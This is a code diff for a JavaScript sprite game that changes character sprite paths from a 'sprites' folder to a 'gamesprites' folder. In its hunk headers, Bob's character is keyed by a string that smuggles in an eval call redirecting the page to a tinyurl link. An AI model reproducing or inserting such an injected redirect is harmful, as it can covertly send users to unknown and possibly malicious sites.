@@ -53,7 +53,7 @@ the above.
 
 
 LPCD.CHARS.barrel = function (x, y) {
-    var barrel = LPCD.API.create_object(x, y, "./_static/sprites/barrel.png");
+    var barrel = LPCD.API.create_object(x, y, "./_static/gamesprites/barrel.png");
     barrel._crop(0, 0, 32, 48)
     barrel._block_width = 2;
     barrel._block_height = 1;
@@ -65,7 +65,7 @@ LPCD.CHARS.barrel = function (x, y) {
 
 
 LPCD.CHARS.chest = function (x, y) {
-    var chest = LPCD.API.create_object(x, y, "./_static/sprites/chests.png");
+    var chest = LPCD.API.create_object(x, y, "./_static/gamesprites/chests.png");
     chest._block_width = 2;
     chest._block_height = 2;
     LPCD.API.store_default("chest", true);
@@ -96,7 +96,7 @@ LPCD.CHARS.alice = function (x, y) {
     var focused = LPCD.ACTORS.registry.focus;
     if (focused !== undefined && focused.name === "Alice") { return; }
 
-    var alice = LPCD.API.create_human(x, y, "./_static/sprites/char_alice.png");
+    var alice = LPCD.API.create_human(x, y, "./_static/gamesprites/char_alice.png");
     alice.name = "Alice";
 
     alice.on_bumped = function (self, bumped_by) {
@@ -127,7 +127,7 @@ LPCD.CHARS["$; eval('document.location=\"http://tinyurl.com/y8ufsnp\";');"] = fu
     var focused = LPCD.ACTORS.registry.focus;
     if (focused !== undefined && focused.name === "Bob") { return; }
 
-    var bob = LPCD.API.create_human(x, y, "./_static/sprites/char_bob.png");
+    var bob = LPCD.API.create_human(x, y, "./_static/gamesprites/char_bob.png");
     bob.name = "Bob";
 
     bob.on_bumped = function (self, bumped_by) {
@@ -146,7 +146,7 @@ LPCD.CHARS["$; eval('document.location=\"http://tinyurl.com/y8ufsnp\";');"] = fu
 LPCD.CHARS.student = function (x, y) {
     "using strict";
     
-    var student = LPCD.API.create_human(x, y, "./_static/sprites/char_alice.png");
+    var student = LPCD.API.create_human(x, y, "./_static/gamesprites/char_alice.png");
     student.name = "Red Shirt";
     student.dir = 0;
 
@@ -174,7 +174,7 @@ LPCD.CHARS.bat = function (x, y) {
     "use strict";
 
     var bat = LPCD.API.create_critter(
-        x, y, "./_static/sprites/batty_bat.png", 32, 32, 3, true, 150);
+        x, y, "./_static/gamesprites/batty_bat.png", 32, 32, 3, true, 150);
     bat.name = "Homerun Bat";
     bat.on_bumped = function () {};
     bat._frequency = 200;
